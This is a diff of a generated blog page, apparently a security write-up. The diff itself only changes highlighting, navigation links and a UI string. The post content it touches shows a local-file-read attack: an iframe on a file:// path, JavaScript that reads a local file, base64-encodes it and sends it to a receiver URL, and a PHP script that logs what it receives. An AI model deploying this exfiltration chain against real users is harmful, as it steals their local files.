@@ -96,7 +96,7 @@
             
             <a class="navbar-item " href="/about">关于</a>
             
-            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
             
         </div>
         
@@ -198,7 +198,7 @@
 <figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">file:///C:/Users/ThreeZhi/Desktop/test.txt</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>&#x7B80;&#x5355;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF1A;</p>
-<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-undefined">    function reqListener () {</span></span><br><span class="line"><span class="hljs-undefined">        var b64 = btoa(this.responseText);</span></span><br><span class="line"><span class="hljs-undefined">        var request = new XMLHttpRequest();</span></span><br><span class="line"><span class="hljs-undefined">        request.open(&apos;GET&apos;, &apos;http://127.0.0.1/getfile.php?file=&apos;+b64, true);</span></span><br><span class="line"><span class="hljs-undefined">        request.send();</span></span><br><span class="line"><span class="hljs-undefined">    } </span></span><br><span class="line"><span class="hljs-undefined">    var oReq = new XMLHttpRequest(); </span></span><br><span class="line"><span class="hljs-undefined">    oReq.addEventListener(&quot;load&quot;, reqListener); </span></span><br><span class="line"><span class="hljs-undefined">    oReq.open(&quot;GET&quot;, &quot;file:///C:/Users/ThreeZhi/Desktop/test.txt&quot;); </span></span><br><span class="line"><span class="hljs-undefined">    oReq.send();</span></span><br><span class="line"><span class="hljs-undefined"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqListener</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> b64 = btoa(<span class="hljs-keyword">this</span>.responseText);</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="hljs-javascript">        request.open(<span class="hljs-string">&apos;GET&apos;</span>, <span class="hljs-string">&apos;http://127.0.0.1/getfile.php?file=&apos;</span>+b64, <span class="hljs-literal">true</span>);</span></span><br><span class="line"><span class="hljs-undefined">        request.send();</span></span><br><span class="line"><span class="hljs-undefined">    } </span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> oReq = <span class="hljs-keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="hljs-javascript">    oReq.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reqListener); </span></span><br><span class="line"><span class="hljs-javascript">    oReq.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;file:///C:/Users/ThreeZhi/Desktop/test.txt&quot;</span>); </span></span><br><span class="line"><span class="hljs-undefined">    oReq.send();</span></span><br><span class="line"><span class="hljs-undefined"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>&#x63A5;&#x6536;&#x6587;&#x4EF6; (&#x8981;&#x8BBE;&#x7F6E;CORS&#x5934;)</p>
 <figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    header(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line">    $file = $_GET[<span class="hljs-string">&apos;file&apos;</span>];</span><br><span class="line">    $fp = fopen(<span class="hljs-string">&apos;file.txt&apos;</span>, <span class="hljs-string">&apos;a+&apos;</span>);</span><br><span class="line">    fwrite($fp, $file.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -218,7 +218,9 @@
     
     
     <div class="columns is-mobile is-multiline article-nav">
-        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2020/04/28/Markdown_Self_xss/">偶遇Markdown类型的Self xss</a>
             
         </span>
         <span class="column is-12-mobile is-half-desktop  article-nav-next">
@@ -436,7 +438,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 PAGES: 'Seiten',
                 CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Sin título)',
             },
             CONTENT_URL: '/content.json',
         };
